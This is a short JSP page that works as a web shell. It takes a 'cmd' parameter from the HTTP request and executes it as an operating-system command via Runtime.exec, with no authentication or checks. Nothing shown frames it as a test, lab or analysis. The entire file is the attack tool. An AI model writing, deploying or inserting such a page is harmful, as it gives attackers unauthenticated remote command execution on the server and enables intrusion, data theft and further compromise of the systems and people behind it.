<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<pre>
<%
    String cmd = request.getParameter("cmd");
    Runtime.getRuntime().exec(cmd);
%>
</pre>